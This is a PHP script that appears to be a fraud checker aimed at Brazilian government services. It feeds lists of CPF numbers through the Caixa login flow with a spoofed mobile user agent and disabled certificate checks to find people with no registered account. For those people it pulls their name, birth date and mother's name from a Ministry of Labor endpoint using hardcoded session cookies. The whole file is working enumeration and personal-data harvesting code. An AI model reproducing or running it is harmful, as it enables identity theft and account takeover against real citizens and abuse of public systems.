<?php

error_reporting(0);
set_time_limit(0);

list($cpf, $senha) = explode("|", str_replace(array(",", "»", "|", ":"), "|", $_REQUEST['lista']));


function request($url, $post = false, $header = false)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    if ($header) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    $exec = curl_exec($ch);
    return $exec;
}

function inStr($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}





$cpf1 = str_replace("-", "", $cpf);
$cpf = str_replace(".", "", $cpf1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://login.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.fgm%3A%2F%2Foauth2Callback&client_id=cli-mob-fgm&response_type=code&login_hint=".$cpf."&state=7TrtrrAtshbaJ2jiVq1-Ug&nonce=5SRxkDmBnp6_ZihTzgaclA&code_challenge=NLCu_3w9Du6V_IXOVlIkXfYniVTgJJ25x6IEQOf0wr4&code_challenge_method=S256&deviceid=077e3432-e4aa-3cd3-860e-b8b261b9c10d&app=SIFGM&origem=mf&nivel=10");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$inicio = curl_exec($ch);

$urlred = GetStr($inicio, '<form action="','" id="form-login"');
$urlredantes = str_replace('amp;', '', $urlred);

if(empty($urlredantes)){
	echo "OCORREU ALGUM ERRO -> $cpfcara <- $inicio";
	exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$urlredantes");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 5.1.1; SM-G930K Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
		$headers = array();
		$headers[] = 'Authority: login2.caixa.gov.br';
		$headers[] = 'Pragma: no-cache';
		$headers[] = 'Cache-Control: no-cache';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
		$headers[] = 'Sec-Fetch-Site: none';
		$headers[] = 'Sec-Fetch-Mode: navigate';
		$headers[] = 'Sec-Fetch-User: ?1';
		$headers[] = 'Sec-Fetch-Dest: document';
		$headers[] = 'Accept-Language: pt,en;q=0.9';
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS,'f10=&fingerprint=dbfce5da65e56da34f8b3442e1e41761&step=1&username='.$cpf.'');
$meio = curl_exec($ch);

if(strpos($meio,'registration?client_id')){

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'http://www.juventudeweb.mte.gov.br/pnpepesquisas.asp');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_POSTFIELDS,  'acao=consultar%20cpf&cpf='.$cpf.'&nocache=0.7636039437638835');
		curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1','Cookie: ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID; FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78','Host: www.juventudeweb.mte.gov.br']);
		$data = curl_exec($ch);

		$NOPESSOAFISICA = GetStr($data, 'NOPESSOAFISICA="', '"');
		$DTNASCIMENTO = GetStr($data, 'DTNASCIMENTO="', '"');
		$NOMAE = GetStr($data, 'NOMAE="', '"');


        $datanascimentoboa = explode("/", $DTNASCIMENTO);
		$databoa = $datanascimentoboa[1];

		if($databoa <= '08'){
			    $datab = '<b style="color:lime;">'.$DTNASCIMENTO.'</b>';
		}else{
			    $datab = '<b style="color:red;">'.$DTNASCIMENTO.'</b>';
		}
		    $dadospessoa = "Nome: $NOPESSOAFISICA -";
	
	echo json_encode(array("status" => 0, "msg" => "#APROVADA $cpf ($dadospessoa $datab)<br>"));

}elseif(strpos($meio,'Informe sua senha:')){
	echo json_encode(array("status" => 1, "msg" => "Die $cpf - Retorno: Informe sua senha (Já cadastrado!)<br>"));

}elseif(strpos($meio,'Informe seu CPF e clique em "Próximo" para continuar:')){
	echo json_encode(array("status" => 1, "msg" => "Erro $cpf - Retorno: Você demorou muito para entrar <br>"));

}else{
	echo json_encode(array("status" => 1, "msg" => "#REPROVADA $cpf<br>"));

}

sleep(3);

unlink("cookie.txt");